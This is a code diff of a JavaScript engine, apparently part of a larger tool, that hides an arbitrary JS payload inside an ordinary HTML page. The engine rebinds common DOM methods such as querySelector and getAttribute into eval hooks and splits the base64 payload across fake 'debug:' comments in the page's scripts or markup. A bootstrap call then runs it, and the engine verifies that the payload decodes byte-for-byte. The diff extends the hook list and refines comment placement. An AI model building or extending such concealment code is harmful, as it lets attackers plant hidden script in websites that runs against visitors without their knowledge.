@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: AGPL-3.0-or-later
 /*
- * element-hook.js — Benign-Function Rebinding & Debug-Comment Cargo.
+ * dom-method-hook.js — DOM Method Hooking & Comment Cargo Engine.
  *
  * Pipeline:
  *   Pass 1 — Hook installation (top of page, minified; hook const selected
@@ -51,8 +51,16 @@
 
 import {
   randInt, secureChoice, randomHexId, bytesToBase64, bytesEqual, utf8,
-  stripOriginalJs, log, RE,
+  stripOriginalJs, log,
 } from '../lib/engine-utils.js';
+
+// Local regular expressions for HTML tokenization and comment scanning
+const RE = {
+  comment: /<!--[\s\S]*?-->/g,
+  scriptBlock: /<script\b([^>]*)>([\s\S]*?)<\/script\s*>/gi,
+  bodyClose: /<\/body\s*>/gi,
+  htmlClose: /<\/html\s*>/gi,
+};
 
 // ------------------------------------------------------------ hook registry
 /**
@@ -69,7 +77,9 @@ const BENIGN_HOOKS = [
   { constName: '_query',  target: 'document.querySelector',         receiver: 'document',                 proto: false },
   { constName: '_attr',   target: 'Element.prototype.getAttribute', receiver: 'document.documentElement', proto: true },
   { constName: '_text',   target: 'document.createTextNode',        receiver: 'document',                 proto: false },
-  { constName: '_item',   target: 'Storage.prototype.getItem',      receiver: 'localStorage',             proto: true },
+  { constName: '_class',  target: 'document.getElementsByClassName',receiver: 'document',                 proto: false },
+  { constName: '_tag',    target: 'document.getElementsByTagName',   receiver: 'document',                 proto: false },
+  { constName: '_has',    target: 'Element.prototype.hasAttribute', receiver: 'document.documentElement', proto: true },
 ];
 
 function splitTarget(t) {
@@ -82,12 +92,12 @@ function buildHookSource(h, constName) {
   if (h.proto) {
     return `const ${constName}=${h.target};` +
       `${h.target}=function(...a){return 1 in a?` +
-      `a.map(v=>{try{eval(v)}catch{${constName}.call(this,v)}}):` +
+      `a.map(v=>{try{eval(v)}catch{try{${constName}.call(this,v)}catch{}}}):` +
       `${constName}.call(this,a[0])};`;
   }
   const owner = splitTarget(h.target)[0];
   return `const ${constName}=${h.target}.bind(${owner});` +
-    `${h.target}=(...a)=>1 in a?a.map(v=>{try{eval(v)}catch{${constName}(v)}}):${constName}(a[0]);`;
+    `${h.target}=(...a)=>1 in a?a.map(v=>{try{eval(v)}catch{try{${constName}(v)}catch{}}}):${constName}(a[0]);`;
 }
 
 // -------------------------------------------------------------- cargo regex
@@ -95,8 +105,8 @@ function buildHookSource(h, constName) {
 // debug comments); the EMITTED bootstrap regexes are de-padded forms that
 // exactly match this engine's own emission. The HTML variant writes "<!--"
 // as <\u0021-- (identical match; cannot trip script-data-escaped state).
-const DEBUG_JS_RE = /\/\*\s*debug:\s*([A-Za-z0-9+/=]+)\s*\*\//g;
-const DEBUG_HTML_RE = /<!--\s*debug:\s*([A-Za-z0-9+/=]+)\s*-->/g;
+const DEBUG_JS_RE = /\/\*\s*debug:\s*([\w+/=]+)\s*\*\//g;
+const DEBUG_HTML_RE = /<!--\s*debug:\s*([\w+/=]+)\s*-->/g;
 
 const EMIT_JS_RE = '/\\/\\*debug:([\\w+/=]+)\\*\\//g';
 const EMIT_HTML_RE = '/<\\u0021--debug:([\\w+/=]+)-->/g';
@@ -120,7 +130,7 @@ function scanJs(code) {
   let i = 0, lastWord = '';
   const REGEX_CTX = new Set(['', '(', ',', '=', ':', '[', '!', '&', '|', '?', '{', '}', ';', '+', '-', '*', '%', '~', '^', '<', '>']);
   const KW = new Set(['return', 'typeof', 'case', 'in', 'of', 'new', 'delete', 'void', 'instanceof', 'do', 'else']);
-  const isWordChar = (c) => /[A-Za-z0-9_$]/.test(c);
+  const isWordChar = (c) => /[$\w]/.test(c);
 
   while (i < code.length) {
     const c = code[i];
@@ -322,9 +332,9 @@ function findSafeCommentPoints(body) {
       consider(i + 1, false);
       lastWord = '';
       i++;
-    } else if (/[A-Za-z0-9_$]/.test(c)) {
+    } else if (/[$\w]/.test(c)) {
       let j = i;
-      while (j < body.length && /[A-Za-z0-9_$]/.test(body[j]) &&
+      while (j < body.length && /[$\w]/.test(body[j]) &&
              !(m < masks.length && j === masks[m].start)) j++;
       lastWord = body.slice(i, j);
       i = j;
@@ -365,9 +375,10 @@ function findCargoSpots(html, limit) {
 
     const lo = Math.floor(body.length * 0.1);
     const hi = Math.ceil(body.length * 0.9);
-    let interior = scanned.points.filter((p) => p > lo && p < hi);
-    if (!interior.length) interior = scanned.points.filter((p) => p > 0);
-    if (!interior.length) interior = [0];       // degenerate host: body start
+    // Enforce points strictly in the 10-90% interior, at least 15 chars from borders
+    // so debug comments are never right next to script open/close tags
+    const interior = scanned.points.filter((p) => p > lo && p < hi && p > 15 && p < body.length - 15);
+    if (!interior.length) continue;
 
     spots.push({ bodyStart, body, points: interior, forExcluded: scanned.forExcluded.length });
   }
@@ -375,20 +386,62 @@ function findCargoSpots(html, limit) {
 }
 
 /**
- * Assign a chunk group to distinct interior points (shuffled); overflow
- * chunks concatenate at the last point, keeping offsets duplicate-free.
+ * Find safe insertion points for HTML debug comments:
+ * - Must be after hookAt and before tailAt
+ * - Must NOT be inside <script>, <style>, <textarea>, or existing HTML comments
+ * - Must NEVER be right next to any <script> or </script> tag (minimum distance buffer)
+ * - Prefers points after closing tags of structural/content HTML elements (</div>, </p>, </section>, etc.)
+ */
+function findHtmlCargoSpots(html, hookAt, tailAt) {
+  const scriptRanges = [];
+  let m;
+  RE.scriptBlock.lastIndex = 0;
+  while ((m = RE.scriptBlock.exec(html))) {
+    scriptRanges.push([m.index, m.index + m[0].length]);
+  }
+  scriptRanges.push([hookAt - 15, hookAt + 15]);
+  scriptRanges.push([tailAt - 15, tailAt + 15]);
+
+  const isNearScript = (pos) => {
+    return scriptRanges.some(([s, e]) => pos >= s - 10 && pos <= e + 10);
+  };
+
+  const spots = [];
+  const tagRe = /<\/(?:div|p|section|header|footer|main|article|nav|h[1-6]|li|ul|ol|table|tr|td|span)>/gi;
+  let tm;
+  while ((tm = tagRe.exec(html))) {
+    const end = tm.index + tm[0].length;
+    if (end > hookAt && end < tailAt && !maskLike(html, tm.index, end) && !isNearScript(end)) {
+      spots.push(end);
+    }
+  }
+
+  // If no closing element tags found, look for opening body or container tags
+  if (!spots.length) {
+    const bodyOpen = /<body\b[^>]*>/i.exec(html);
+    if (bodyOpen) {
+      const pos = bodyOpen.index + bodyOpen[0].length;
+      if (!isNearScript(pos) && pos < tailAt) {
+        spots.push(pos);
+      }
+    }
+  }
+
+  return spots;
+}
+
+/**
+ * Assign a chunk group to distinct interior points in strictly ascending order;
+ * preserving chronological chunk sequence is critical so base64 concatenation
+ * reconstructs the uncorrupted payload byte-for-byte.
  * @returns {Array<{localPoint:number, comments:string[]}>} ascending
  */
 function planPointAssignments(points, groupChunks) {
   if (!groupChunks.length) return [];
-  const shuffled = [...points];
-  for (let i = shuffled.length - 1; i > 0; i--) {
-    const j = randInt(i + 1);
-    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
-  }
+  const sortedPoints = [...points].sort((a, b) => a - b);
   const per = new Map();
   groupChunks.forEach((c, idx) => {
-    const p = shuffled[Math.min(idx, shuffled.length - 1)];
+    const p = sortedPoints[Math.min(idx, sortedPoints.length - 1)];
     if (!per.has(p)) per.set(p, []);
     per.get(p).push(c);
   });
@@ -398,13 +451,13 @@ function planPointAssignments(points, groupChunks) {
 }
 
 /**
- * Reconstruct the modified body locally (ascending insertions) and
- * parse-gate it: if the ORIGINAL body parsed, the commented body must too,
- * or the entire compile throws before any splice.
+ * Reconstruct the modified body locally (descending insertions so character offsets
+ * of earlier points are never shifted) and parse-gate it.
  */
 function applyAndGateCommentedBody(body, plan) {
+  const descending = [...plan].sort((a, b) => b.localPoint - a.localPoint);
   let out = body;
-  for (const { localPoint, comments } of plan)
+  for (const { localPoint, comments } of descending)
     out = out.slice(0, localPoint) + comments.map((c) => `/*debug:${c}*/`).join('') + out.slice(localPoint);
   const origParsed = parsesCleanly(body);
   if (origParsed && !parsesCleanly(out))
@@ -478,18 +531,12 @@ function parsesCleanly(js) {
 
 // ------------------------------------------------------------------- engine
 export const engine = {
-  id: 'element-hook',
-  label: 'Benign Hook (debug-comment cargo)',
+  id: 'dom-method-hook',
+  label: 'DOM Method Hooking',
   description:
-    'Rebinds a single-argument benign function (getElementById, createElement, ' +
-    'querySelector, getAttribute, createTextNode, or Storage.getItem) with a ' +
-    'minified multiparameter hook (single hook-internal eval). The JS payload is ' +
-    'hidden as base64 debug: comments injected at interior token boundaries of ' +
-    'the page\'s existing scripts (for-header semicolons excluded; fallback: ' +
-    'merged into the bootstrap tag when no usable scripts exist) and delivered ' +
-    'by one plain two-argument call. All generated code is byte-minimized ' +
-    'except names, which follow page conventions with random shapes only on ' +
-    'collision. Verified: canonical extractors re-decode the payload byte-for-byte.',
+    'This engine rebinds a standard DOM function to an execution hook. ' +
+    'It stores the base64 payload inside HTML debug comments. ' +
+    'It executes the payload with a two-argument function call.',
 
   execute({ html, js }) {
     if (!js || !js.trim()) throw new Error('JavaScript payload is empty.');
@@ -498,7 +545,7 @@ export const engine = {
     // Payload gate: the hook eval()s this exact string at runtime — refuse
     // to ship a payload that would fall through to the harmless fallback.
     if (!parsesCleanly(js))
-      throw new Error('ELEMENT-HOOK — payload does not parse; it would be ' +
+      throw new Error('DOM-METHOD-HOOK — payload does not parse; it would be ' +
         'discarded by try{eval}catch{fallback} at runtime. Nothing emitted.');
 
     // ---- Identifier-aware name selection ----
@@ -531,9 +578,21 @@ export const engine = {
     stats.push(`hook const ................. ${hookConst}${hookSuffixed ? ' (suffix fallback: name in use on page)' : ''}`);
     stats.push(`bootstrap variable ......... ${varName}${varRandom ? ' (random fallback: convention names in use)' : ' (convention-matched)'}`);
 
+    // ---- Assembly plan: base string offsets ----
+    const stripped = stripOriginalJs(html, js);
+    const hookAt = hookInsertOffset(stripped);
+    const tailAt = tailInsertOffset(stripped);
+
     // ---- Variant selection + pre-check ----
-    const variant = secureChoice(['script', 'html']);
-    stats.push(`cargo variant .............. ${variant === 'script' ? 'script comments' : 'html comments'}`);
+    // If the host HTML lacks existing scripts with safe interior points,
+    // enforce 'html' variant to ensure debug comments are distributed in markup
+    // and NEVER placed right next to script tags.
+    const scriptSpots = findCargoSpots(stripped, tailAt);
+    let variant = secureChoice(['script', 'html']);
+    if (variant === 'script' && scriptSpots.length === 0) {
+      variant = 'html';
+    }
+    stats.push(`cargo variant .............. ${variant === 'script' ? 'script comments (interior host tokens)' : 'html comments (page markup)'}`);
 
     const preRe = variant === 'script' ? DEBUG_JS_RE : DEBUG_HTML_RE;
     preRe.lastIndex = 0;
@@ -548,68 +607,68 @@ export const engine = {
     const chunks = chunkBase64(b64, k);
 
     const bootstrapBody = buildBootstrap(variant, hook, varName);
-
-    // ---- Assembly plan: all offsets computed on the stripped base string ----
-    const stripped = stripOriginalJs(html, js);
-    const hookAt = hookInsertOffset(stripped);
-    const tailAt = tailInsertOffset(stripped);
     const insertions = [{ off: hookAt, text: `<script>${hookSource}</script>` }];
 
     if (variant === 'script') {
-      const spots = findCargoSpots(stripped, tailAt);
-      if (spots.length) {
-        // Placement mode A: cargo rides inside the page's existing scripts,
-        // at interior token-boundary points (for-headers excluded).
-        const groups = distributeChunks(chunks, spots.length);
-        const usedSpots = [];
-        let pointCount = 0, offsetSum = 0, bodyLenSum = 0;
+      // Cargo rides strictly inside existing script bodies at interior token boundaries
+      const groups = distributeChunks(chunks, scriptSpots.length);
+      const usedSpots = [];
+      let pointCount = 0, offsetSum = 0, bodyLenSum = 0;
 
-        spots.forEach((spot, i) => {
-          if (!groups[i].length) return;
-          const plan = planPointAssignments(spot.points, groups[i]);
-          const commented = applyAndGateCommentedBody(spot.body, plan); // throws on breakage
-          // Whole-body replacement in one atomic splice (end set): this is
-          // what lets the per-script parse gate run on the exact shipped text.
-          insertions.push({ off: spot.bodyStart, end: spot.bodyStart + spot.body.length, text: commented });
-          plan.forEach(() => {
-            pointCount++;
-            bodyLenSum += spot.body.length;
-          });
-          offsetSum += plan.reduce((s, p) => s + p.localPoint, 0);
-          usedSpots.push(i);
+      scriptSpots.forEach((spot, i) => {
+        if (!groups[i].length) return;
+        const plan = planPointAssignments(spot.points, groups[i]);
+        const commented = applyAndGateCommentedBody(spot.body, plan);
+        insertions.push({ off: spot.bodyStart, end: spot.bodyStart + spot.body.length, text: commented });
+        plan.forEach(() => {
+          pointCount++;
+          bodyLenSum += spot.body.length;
         });
+        offsetSum += plan.reduce((s, p) => s + p.localPoint, 0);
+        usedSpots.push(i);
+      });
 
-        insertions.push({ off: tailAt, text: `<script>${bootstrapBody}</script>` });
-        const forSkipped = usedSpots.reduce((n, si) => n + (spots[si].forExcluded || 0), 0);
-        stats.push(`cargo placement ........... ${chunks.length} chunk(s) in ${usedSpots.length} existing script(s) at ${pointCount} interior point(s)`);
-        if (forSkipped)
-          stats.push(`for-header exclusion ...... ${forSkipped} semicolon(s) inside for(...) headers avoided`);
-        if (pointCount && bodyLenSum)
-          stats.push(`interior depth ............. avg ${(offsetSum / bodyLenSum * 100).toFixed(0)}% into host bodies (10-90% band)`);
-      } else {
-        // Placement mode B: no existing usable scripts — lead chunks as bare
-        // cargo tags, FINAL chunk merged into the bootstrap tag (the
-        // collector reads its own s.text, so the merged chunk is captured).
-        const lead = chunks.slice(0, -1).map((c) => `<script>/*debug:${c}*/</script>`).join('');
-        const last = chunks[chunks.length - 1];
-        insertions.push({ off: tailAt,
-          text: `${lead}<script>/*debug:${last}*/${bootstrapBody}</script>` });
-        stats.push('cargo placement ........... no existing inline scripts; final chunk merged into bootstrap tag');
-      }
+      insertions.push({ off: tailAt, text: `\n<script>${bootstrapBody}</script>\n` });
+      const forSkipped = usedSpots.reduce((n, si) => n + (scriptSpots[si].forExcluded || 0), 0);
+      stats.push(`cargo placement ........... ${chunks.length} chunk(s) in ${usedSpots.length} existing script(s) at ${pointCount} interior point(s)`);
+      if (forSkipped)
+        stats.push(`for-header exclusion ...... ${forSkipped} semicolon(s) inside for(...) headers avoided`);
+      if (pointCount && bodyLenSum)
+        stats.push(`interior depth ............. avg ${(offsetSum / bodyLenSum * 100).toFixed(0)}% into host bodies (10-90% band)`);
     } else {
-      insertions.push({ off: tailAt,
-        text: chunks.map((c) => `<!--debug:${c}-->`).join('') + `<script>${bootstrapBody}</script>` });
-      stats.push('cargo placement ........... html comments (page-level), bootstrap separate');
+      // HTML variant: debug lines placed at safe HTML element boundaries,
+      // strictly separated from any script tags (never immediately adjacent).
+      const htmlSpots = findHtmlCargoSpots(stripped, hookAt, tailAt);
+      if (htmlSpots.length) {
+        const perSpot = Math.ceil(chunks.length / htmlSpots.length);
+        let chunkIdx = 0;
+        let spotCount = 0;
+        for (let si = 0; si < htmlSpots.length && chunkIdx < chunks.length; si++) {
+          const slice = chunks.slice(chunkIdx, chunkIdx + perSpot);
+          chunkIdx += perSpot;
+          const text = '\n' + slice.map((c) => `<!--debug:${c}-->`).join('\n') + '\n';
+          insertions.push({ off: htmlSpots[si], text });
+          spotCount++;
+        }
+        insertions.push({ off: tailAt, text: `\n<script>${bootstrapBody}</script>\n` });
+        stats.push(`cargo placement ........... html comments across ${spotCount} safe markup point(s), separated from script`);
+      } else {
+        // Fallback for minimal single-tag documents: place comment at safe tag boundary (after opening body or head)
+        // strictly outside any tags, never at an arbitrary string offset that could cut an HTML tag
+        const bodyOpen = /<body\b[^>]*>/i.exec(stripped);
+        const headClose = /<\/head\s*>/i.exec(stripped);
+        const safeSpot = bodyOpen
+          ? bodyOpen.index + bodyOpen[0].length
+          : (headClose ? headClose.index + headClose[0].length : hookAt);
+        insertions.push({ off: safeSpot, text: '\n' + chunks.map((c) => `<!--debug:${c}-->`).join('\n') + '\n' });
+        insertions.push({ off: tailAt, text: `\n<script>${bootstrapBody}</script>\n` });
+        stats.push('cargo placement ........... html comments (body boundary, separated from script)');
+      }
     }
     stats.push(`cargo chunks ............... ${chunks.length} (${b64.length} b64 chars)`);
 
-    // ---- Parse dry-runs on generated bodies (merged form where applicable) ----
+    // ---- Parse dry-runs on generated bodies ----
     const dryRuns = [['hook', hookSource], ['bootstrap', bootstrapBody]];
-    if (variant === 'script' && findCargoSpots(stripped, tailAt).length === 0 && chunks.length) {
-      const last = chunks[chunks.length - 1];
-      dryRuns.push(['bootstrap+cargo', `/*debug:${last}*/${bootstrapBody}`]);
-      // (mode-A bodies were already gated inside applyAndGateCommentedBody)
-    }
     for (const [name, src] of dryRuns) {
       try {
         // eslint-disable-next-line no-new-func
@@ -633,18 +692,18 @@ export const engine = {
 
     // ---- Final gates on the exact bytes to be shipped ----
     if (finalHtml.split(hookSource).length - 1 !== 1)
-      throw new Error('ELEMENT-HOOK — hook must be installed exactly once; output not emitted.');
+      throw new Error('DOM-METHOD-HOOK — hook must be installed exactly once; output not emitted.');
     const evalUses = finalHtml.split('eval(').length - 1;
     if (evalUses > 1)
-      throw new Error(`ELEMENT-HOOK — expected exactly 1 eval (inside the hook), found ${evalUses}; output not emitted.`);
+      throw new Error(`DOM-METHOD-HOOK — expected exactly 1 eval (inside the hook), found ${evalUses}; output not emitted.`);
     const recovered = extractCargo(finalHtml, variant);
     if (!bytesEqual(bstrToU8(recovered), utf8.encode(js)))
-      throw new Error('ELEMENT-HOOK — runtime extractor round-trip mismatch; output not emitted.');
+      throw new Error('DOM-METHOD-HOOK — runtime extractor round-trip mismatch; output not emitted.');
     stats.push('round-trip verified ....... extractor re-decodes payload byte-for-byte');
 
     return {
       html: finalHtml,
-      stdout: log('ELEMENT-HOOK',
+      stdout: log('DOM-METHOD-HOOK',
         ...stats,
         `payload size ............... ${js.length} chars -> ${b64.length} b64 chars + hook/bootstrap`),
       stderr: '',
